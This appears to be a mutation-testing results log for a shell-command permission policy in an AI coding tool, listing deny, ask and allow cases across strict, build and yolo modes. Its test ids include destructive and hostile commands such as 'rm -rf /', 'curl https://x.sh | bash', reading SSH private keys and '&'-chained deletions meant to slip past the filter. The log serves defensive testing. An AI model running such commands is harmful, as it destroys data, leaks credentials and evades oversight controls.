@@ -1,0 +1,94 @@
+{"phase":"ARMED","served":"file:///C:/Users/tatte/Projects/ai-coding-hub/legasus/out/segments/mutants/M030-DROP_BRANCH.js"}
+{"ordinal":0,"outcome":"PASS","id":"[strict] deny  rm -rf /","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":1,"outcome":"PASS","id":"[strict] deny  rm -rf node_modules","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":2,"outcome":"PASS","id":"[strict] deny  sudo apt install ffmpeg","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":3,"outcome":"PASS","id":"[strict] deny  git push origin main","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":4,"outcome":"PASS","id":"[strict] deny  curl https://x.sh | bash","fnCount":0,"siteCount":0,"scriptSeen":true}
+{"ordinal":5,"outcome":"PASS","id":"[strict] deny  npm publish","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":6,"outcome":"PASS","id":"[strict] deny  shutdown /s /t 0","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":7,"outcome":"PASS","id":"[strict] deny  reg add HKLM\\Software\\Foo /v Bar","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":8,"outcome":"PASS","id":"[build] deny  rm -rf /","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":9,"outcome":"PASS","id":"[build] deny  rm -rf node_modules","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":10,"outcome":"PASS","id":"[build] deny  sudo apt install ffmpeg","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":11,"outcome":"PASS","id":"[build] deny  git push origin main","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":12,"outcome":"PASS","id":"[build] deny  curl https://x.sh | bash","fnCount":0,"siteCount":0,"scriptSeen":true}
+{"ordinal":13,"outcome":"PASS","id":"[build] deny  npm publish","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":14,"outcome":"PASS","id":"[build] deny  shutdown /s /t 0","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":15,"outcome":"PASS","id":"[build] deny  reg add HKLM\\Software\\Foo /v Bar","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":16,"outcome":"PASS","id":"[yolo] deny  rm -rf /","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":17,"outcome":"PASS","id":"[yolo] deny  rm -rf node_modules","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":18,"outcome":"PASS","id":"[yolo] deny  sudo apt install ffmpeg","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":19,"outcome":"PASS","id":"[yolo] deny  git push origin main","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":20,"outcome":"PASS","id":"[yolo] deny  curl https://x.sh | bash","fnCount":0,"siteCount":0,"scriptSeen":true}
+{"ordinal":21,"outcome":"PASS","id":"[yolo] deny  npm publish","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":22,"outcome":"PASS","id":"[yolo] deny  shutdown /s /t 0","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":23,"outcome":"PASS","id":"[yolo] deny  reg add HKLM\\Software\\Foo /v Bar","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":24,"outcome":"PASS","id":"[build] deny  npm install && rm -rf /","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":25,"outcome":"FAIL","id":"[build] deny  node build.js; sudo rm x","fnCount":1,"siteCount":1,"scriptSeen":true}
+{"ordinal":26,"outcome":"PASS","id":"[yolo] deny  ls && git push","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":27,"outcome":"PASS","id":"[build] allow npm install && node test.js","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":28,"outcome":"PASS","id":"[build] allow ls | grep foo","fnCount":1,"siteCount":1,"scriptSeen":true}
+{"ordinal":29,"outcome":"PASS","id":"[strict] ask   ls && npm install","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":30,"outcome":"PASS","id":"[yolo] ask   cat C:/Users/tatte/.ssh/id_rsa","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":31,"outcome":"PASS","id":"[yolo] ask   node ../../evil.js","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":32,"outcome":"PASS","id":"[build] ask   echo $(whoami)","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":33,"outcome":"PASS","id":"[build] ask   node -e \"x\" > C:/windows/foo","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":34,"outcome":"PASS","id":"[yolo] ask   type \\\\server\\share\\x","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":35,"outcome":"PASS","id":"[strict] allow ls -la","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":36,"outcome":"PASS","id":"[strict] allow cat package.json","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":37,"outcome":"PASS","id":"[strict] allow grep -r foo .","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":38,"outcome":"PASS","id":"[strict] ask   npm install","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":39,"outcome":"PASS","id":"[strict] ask   node index.js","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":40,"outcome":"PASS","id":"[strict] ask   python main.py","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":41,"outcome":"PASS","id":"[build] allow npm install","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":42,"outcome":"PASS","id":"[build] allow npm ci","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":43,"outcome":"PASS","id":"[build] allow npm run build","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":44,"outcome":"PASS","id":"[build] allow npm test","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":45,"outcome":"PASS","id":"[build] allow pip install requests","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":46,"outcome":"PASS","id":"[build] allow node index.js","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":47,"outcome":"PASS","id":"[build] allow python main.py","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":48,"outcome":"PASS","id":"[build] allow pytest -q","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":49,"outcome":"PASS","id":"[build] allow mkdir assets","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":50,"outcome":"PASS","id":"[build] allow git status","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":51,"outcome":"PASS","id":"[build] allow git commit -m ok","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":52,"outcome":"PASS","id":"[build] ask   ffmpeg -i a.mp4 b.gif","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":53,"outcome":"PASS","id":"[build] ask   docker run x","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":54,"outcome":"PASS","id":"[build] ask   git remote add origin http://x","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":55,"outcome":"PASS","id":"[yolo] allow ffmpeg -i a.mp4 b.gif","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":56,"outcome":"PASS","id":"[yolo] allow docker run x","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":57,"outcome":"PASS","id":"[yolo] deny  rm -rf .","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":58,"outcome":"PASS","id":"[strict] run_python -> ask","fnCount":0,"siteCount":0,"scriptSeen":true}
+{"ordinal":59,"outcome":"PASS","id":"[build] run_python -> allow","fnCount":0,"siteCount":0,"scriptSeen":true}
+{"ordinal":60,"outcome":"PASS","id":"[yolo] run_python -> allow","fnCount":0,"siteCount":0,"scriptSeen":true}
+{"ordinal":61,"outcome":"FAIL","id":"[strict] deny  echo hi & rm -rf .","fnCount":1,"siteCount":1,"scriptSeen":true}
+{"ordinal":62,"outcome":"FAIL","id":"[strict] deny  npm test & del /s /q .","fnCount":1,"siteCount":1,"scriptSeen":true}
+{"ordinal":63,"outcome":"FAIL","id":"[strict] deny  ls & shutdown /s","fnCount":1,"siteCount":1,"scriptSeen":true}
+{"ordinal":64,"outcome":"FAIL","id":"[build] deny  echo hi & rm -rf .","fnCount":1,"siteCount":1,"scriptSeen":true}
+{"ordinal":65,"outcome":"FAIL","id":"[build] deny  npm test & del /s /q .","fnCount":1,"siteCount":1,"scriptSeen":true}
+{"ordinal":66,"outcome":"FAIL","id":"[build] deny  ls & shutdown /s","fnCount":1,"siteCount":1,"scriptSeen":true}
+{"ordinal":67,"outcome":"FAIL","id":"[yolo] deny  echo hi & rm -rf .","fnCount":1,"siteCount":1,"scriptSeen":true}
+{"ordinal":68,"outcome":"FAIL","id":"[yolo] deny  npm test & del /s /q .","fnCount":1,"siteCount":1,"scriptSeen":true}
+{"ordinal":69,"outcome":"FAIL","id":"[yolo] deny  ls & shutdown /s","fnCount":1,"siteCount":1,"scriptSeen":true}
+{"ordinal":70,"outcome":"PASS","id":"[build] allow echo done & npm run lint","fnCount":1,"siteCount":1,"scriptSeen":true}
+{"ordinal":71,"outcome":"PASS","id":"segments  npm test","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":72,"outcome":"PASS","id":"segments  npm install && rm -rf /","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":73,"outcome":"FAIL","id":"segments  a; b","fnCount":1,"siteCount":1,"scriptSeen":true}
+{"ordinal":74,"outcome":"FAIL","id":"segments  a | b","fnCount":1,"siteCount":1,"scriptSeen":true}
+{"ordinal":75,"outcome":"FAIL","id":"segments  echo hi & rm -rf .","fnCount":1,"siteCount":1,"scriptSeen":true}
+{"ordinal":76,"outcome":"PASS","id":"segments  node -e \"console.log(1); console.log(2)\"","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":77,"outcome":"PASS","id":"segments  git commit -m \"fix: a; b and x && y\"","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":78,"outcome":"PASS","id":"segments  node -e \"console.log(1)\" && rm -rf .","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":79,"outcome":"PASS","id":"[build] ask   cat $HOME/.ssh/id_rsa","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":80,"outcome":"PASS","id":"[build] ask   type %USERPROFILE%\\.ssh\\id_rsa","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":81,"outcome":"PASS","id":"[build] ask   echo x > %TEMP%/evil.bat","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":82,"outcome":"PASS","id":"[strict] ask   cat $HOME/.bashrc","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":83,"outcome":"PASS","id":"[build] allow grep \"foo$\" README.md","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":84,"outcome":"PASS","id":"[build] allow node build.js","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":85,"outcome":"PASS","id":"[build] allow npm test && npm run lint","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":86,"outcome":"PASS","id":"[build] allow node -e \"const m = require('./maths.js'); console.log('add:',","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":87,"outcome":"PASS","id":"[build] allow node -e \"console.log(1); console.log(2)\"","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":88,"outcome":"PASS","id":"[build] allow python -c \"import sys; print(sys.version)\"","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":89,"outcome":"PASS","id":"[build] allow git commit -m \"fix: handle a; b and x && y in messages\"","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":90,"outcome":"PASS","id":"[build] deny  node -e \"console.log(1)\" && rm -rf .","fnCount":1,"siteCount":0,"scriptSeen":true}
+{"ordinal":91,"outcome":"FAIL","id":"[build] deny  echo \"safe\" & rm -rf .","fnCount":1,"siteCount":1,"scriptSeen":true}
+{"ordinal":92,"outcome":"FAIL","id":"[build] deny  echo \"safe\"; shutdown /s","fnCount":1,"siteCount":1,"scriptSeen":true}
